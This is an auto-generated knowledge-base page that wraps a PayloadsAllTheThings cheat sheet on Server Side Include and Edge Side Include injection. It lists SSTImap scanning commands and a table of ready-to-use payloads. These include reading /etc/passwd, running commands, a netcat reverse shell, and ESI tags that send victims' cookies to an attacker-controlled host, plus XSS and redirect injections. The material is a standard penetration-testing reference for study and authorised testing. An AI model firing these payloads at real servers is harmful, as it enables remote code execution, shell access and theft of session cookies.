---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Include Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-include-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Include Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Server Side Include Injection](../../topics/server-side-include-injection/server-side-include-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-server-side-include-injection-readme |
| name | Server Side Include Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Include%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# Server Side Include Injection\n\n> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated\
  \ on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page,\
  \ without having to serve the entire page via a CGI program, or other dynamic technology.\n\n## Summary\n\n* [Tools](#tools)\n\
  * [Methodology](#methodology)\n* [Edge Side Inclusion](#edge-side-inclusion)\n* [References](#references)\n\n## Tools\n\n\
  * [vladko312/SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based\
  \ on [epinna/tplmap](https://github.com/epinna/tplmap), supports SSI detection and exploitation with `--legacy` or `-e SSI`\n\
  \n  ```bash\n  python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s\n  python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message'\
  \ -l 5 -e SSI\n  python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'\n\
  \  ```\n\n## Methodology\n\nSSI Injection occurs when an attacker can input Server Side Include directives into a web application.\
  \ SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input\
  \ is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access\
  \ sensitive information or execute commands.\n\nSSI format: `<!--#directive param=\"value\" -->`\n\n| Description      \
  \       | Payload                                  |\n| ----------------------- | ----------------------------------------\
  \ |\n| Print the date          | `<!--#echo var=\"DATE_LOCAL\" -->`         |\n| Print the document name | `<!--#echo var=\"\
  DOCUMENT_NAME\" -->`      |\n| Print all the variables | `<!--#printenv -->`                      |\n| Setting variables\
  \       | `<!--#set var=\"name\" value=\"Rich\" -->`   |\n| Include a file          | `<!--#include file=\"/etc/passwd\"\
  \ -->`    |\n| Include a file          | `<!--#include virtual=\"/index.html\" -->` |\n| Execute commands        | `<!--#exec\
  \ cmd=\"ls\" -->`                 |\n| Reverse shell           | `<!--#exec cmd=\"mkfifo /tmp/f;nc IP PORT 0</tmp/f\\|/bin/bash\
  \ 1>/tmp/f;rm /tmp/f\" -->` |\n\n## Edge Side Inclusion\n\nHTTP surrogates cannot differentiate between genuine ESI tags\
  \ from the upstream server and malicious ones embedded in the HTTP response. This means that if an attacker manages to inject\
  \ ESI tags into the HTTP response, the surrogate will process and evaluate them without question, assuming they are legitimate\
  \ tags originating from the upstream server.\n\nSome surrogates will require ESI handling to be signaled in the Surrogate-Control\
  \ HTTP header.\n\n```ps1\nSurrogate-Control: content=\"ESI/1.0\"\n```\n\n| Description             | Payload           \
  \                       |\n| ----------------------- | ---------------------------------------- |\n| Blind detection   \
  \      | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]>`  |\n| XSS                     | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>`\
  \ |\n| Cookie stealer          | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>` |\n\
  | Include a file          | `<esi:include src=\"supersecret.txt\">` |\n| Display debug info      | `<esi:debug/>` |\n| Add\
  \ header              | `<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->` |\n| Inline fragment      \
  \   | `<esi:inline name=\"/attack.html\" fetchable=\"yes\"><script>prompt('XSS')</script></esi:inline>` |\n\n| Software\
  \ | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |\n| -------- | -------- | ---- | ------- | -------------------------\
  \ | -------------- |\n| Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |\n| Varnish Cache\
  \ | Yes | No   | No      | Yes                       | Yes            |\n| Fastly   | Yes      | No   | No      | No   \
  \                     | Yes            |\n| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No              | No      \
  \       |\n| NodeJS' esi | Yes   | Yes  | Yes     | No                        | No             |\n| NodeJS' nodesi | Yes\
  \ | No  | No      | No                        | Optional       |\n\n## References\n\n* [Beyond XSS: Edge Side Include Injection\
  \ - Louis Dion-Marcil - April 3, 2018](https://web.archive.org/web/20190321030437/https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection)\n\
  * [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://web.archive.org/web/20250916100719/https://www.youtube.com/watch?v=VUZGZnpSg8I)\n\
  * [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://web.archive.org/web/20260208231729/https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations)\n\
  * [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://web.archive.org/web/20260115183939/https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)\n\
  * [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://web.archive.org/web/20210615171520/https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)\n\
  * [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://web.archive.org/web/20220123033237/https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)"
_relative_path: Server Side Include Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Include Injection/README.md
````
